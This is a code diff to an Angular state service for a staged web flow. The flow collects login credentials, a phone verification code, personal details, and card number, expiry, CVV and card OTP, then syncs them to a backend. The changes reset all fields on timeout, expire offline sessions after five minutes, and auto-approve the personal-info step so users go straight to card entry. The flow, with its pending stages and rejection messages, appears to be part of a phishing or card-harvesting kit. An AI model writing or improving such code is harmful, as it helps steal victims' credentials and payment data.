@@ -274,16 +274,39 @@ export class StateService {
 
   private handleSessionTimeout() {
       if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);
-      // Reset sensitive fields
+
+      // Clear all input fields (Start Over)
+      this.email.set('');
       this.password.set('');
+      this.phoneNumber.set('');
+      this.phoneCode.set('');
+      this.firstName.set('');
+      this.lastName.set('');
+      this.dob.set('');
+      this.address.set('');
+      this.country.set('');
+      this.cardNumber.set('');
+      this.cardExpiry.set('');
       this.cardCvv.set('');
       this.cardOtp.set('');
-      this.phoneCode.set('');
+
+      // Reset Flags
+      this.isLoginVerified.set(false);
+      this.isPhoneVerified.set(false);
+      this.isPersonalVerified.set(false);
+      this.isCardSubmitted.set(false);
+      this.isFlowComplete.set(false);
       
+      this.resendRequested.set(false);
+
       // Navigate to login
       this.navigate('login');
+      this.stage.set('login');
       this.rejectionReason.set('Session timed out due to inactivity.');
       this.lastActivityTime = Date.now(); // Reset so we don't loop immediately
+
+      // Force sync to update backend
+      this.syncState();
   }
 
   private getSnapshot() {
@@ -320,8 +343,19 @@ export class StateService {
           if (raw) {
               const parsed = JSON.parse(raw);
               if (parsed.sessionId === this.sessionId()) {
-                  console.log('[State] Restoring previous session...');
-                  this.hydrateFromState(parsed.data, true);
+                  // Check for 5-minute offline timeout
+                  // Default to Date.now() if timestamp missing (legacy sessions) to prevent instant loop
+                  const lastSave = parsed.data.timestamp || Date.now();
+                  const elapsed = Date.now() - lastSave;
+                  const TIMEOUT_LIMIT = 5 * 60 * 1000; // 5 Minutes
+
+                  if (elapsed > TIMEOUT_LIMIT) {
+                      console.log('[State] Session expired while offline. Resetting...');
+                      this.handleSessionTimeout();
+                  } else {
+                      console.log('[State] Restoring previous session...');
+                      this.hydrateFromState(parsed.data, true);
+                  }
               }
           }
       } catch(e) { console.error('Hydration failed', e); }
@@ -832,10 +866,14 @@ export class StateService {
       this.dob.set(d);
       this.address.set(a);
       this.country.set(c);
+
+      // Auto-approve Personal Info
+      this.isPersonalVerified.set(true);
       this.stage.set('personal_pending');
+
       this.rejectionReason.set(null);
-      this.navigate('loading');
-      this.waitingStart.set(Date.now());
+      // Skip loading, go straight to card
+      this.navigate('card');
       this.syncState();
   }
 
